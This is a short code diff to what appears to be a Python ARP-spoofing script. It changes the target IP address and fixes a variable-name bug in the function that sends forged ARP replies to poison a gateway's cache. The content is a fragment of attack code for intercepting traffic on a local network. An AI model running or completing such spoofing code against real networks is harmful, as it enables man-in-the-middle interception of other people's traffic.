@@ -8,7 +8,7 @@ import threading
 import signal
 
 interface = "eth0"
-target_ip = "192.168.1.7"
+target_ip = "192.168.1.2"
 gateway_ip = "192.168.1.1"
 packet_count = 1000
 
@@ -49,7 +49,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     poison_gateway = ARP()
     poison_gateway.op = 2
-    poison_gateway.psrc = targetip
+    poison_gateway.psrc = target_ip
     poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = gateway_mac
 
